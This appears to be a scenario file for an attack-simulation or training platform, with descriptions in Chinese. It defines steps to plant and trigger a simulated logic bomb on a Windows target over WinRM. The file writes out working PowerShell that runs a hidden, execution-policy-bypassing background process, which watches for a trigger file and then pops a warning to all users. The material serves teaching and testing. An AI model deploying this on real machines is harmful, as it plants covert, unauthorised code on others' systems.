name: Windows Logic Bomb Attack Simulation
description: 教学与测试目的：通过 WinRM 远程通道在 Windows 靶机上模拟逻辑炸弹（Logic Bomb）攻击。炸弹以隐藏 PowerShell 后台进程持续运行，每秒检查 C:\Users\Public\trigger_file.txt 是否存在。触发后通过 msg 命令向所有登录用户弹出全屏警告对话框，并生成引爆标记文件。完整演示逻辑炸弹的隐藏驻留、条件触发与桌面级视觉冲击效果。

steps.name: Prepare Logic Bomb Scripts
steps.description: 在攻击机本地生成两个 PowerShell 脚本：炸弹部署脚本（含隐藏后台监听逻辑 + 自清理）和触发脚本。
argsTemplate:
cat > /tmp/logic_bomb_deploy.ps1 << 'PSEOF1'
$bombCode = @'
while ($true) {
  if (Test-Path 'C:/Users/Public/trigger_file.txt') {
    $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    "BOOM! Logic bomb triggered at $ts" | Out-File 'C:/Users/Public/BOMB_EXPLODED.txt' -Force
    msg * '!!! WARNING: Logic Bomb Detonated !!!  System integrity compromised.'
    Remove-Item 'C:/Users/Public/trigger_file.txt' -Force
    break
  }
  Start-Sleep -Seconds 1
}
'@
Remove-Item 'C:/Users/Public/trigger_file.txt','C:/Users/Public/BOMB_EXPLODED.txt','C:/Users/Public/logic_bomb.ps1' -Force -ErrorAction SilentlyContinue
Set-Content -Path 'C:/Users/Public/logic_bomb.ps1' -Value $bombCode
$proc = Start-Process powershell -ArgumentList '-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File C:/Users/Public/logic_bomb.ps1' -PassThru
Write-Output "Logic bomb deployed. PID: $($proc.Id)"
Write-Output "Logic bomb running in background"
PSEOF1
cat > /tmp/trigger_bomb.ps1 << 'PSEOF2'
New-Item -Path 'C:/Users/Public/trigger_file.txt' -ItemType File -Force | Out-Null
Write-Output "Trigger file created: C:/Users/Public/trigger_file.txt"
Write-Output "Waiting for detonation..."
Start-Sleep -Seconds 3
if (Test-Path 'C:/Users/Public/BOMB_EXPLODED.txt') {
  Write-Output ""
  Write-Output "========== BOOM! LOGIC BOMB TRIGGERED =========="
  Get-Content 'C:/Users/Public/BOMB_EXPLODED.txt'
  Write-Output "================================================="
} else {
  Write-Output "ERROR: Bomb did not trigger. Check target."
}
PSEOF2
echo 'Scripts created: /tmp/logic_bomb_deploy.ps1, /tmp/trigger_bomb.ps1'

steps.name: Deploy Logic Bomb to Windows Target
steps.description: 通过 WinRM 将炸弹脚本上传至 Windows 靶机，并以隐藏后台进程启动，开始每秒监听触发条件。

steps.name: Trigger Logic Bomb on Target
steps.description: 通过 WinRM 在靶机上创建触发文件，引爆逻辑炸弹——Windows 桌面弹出全屏 msg 警告对话框，同时生成引爆标记文件 C:\Users\Public\BOMB_EXPLODED.txt。
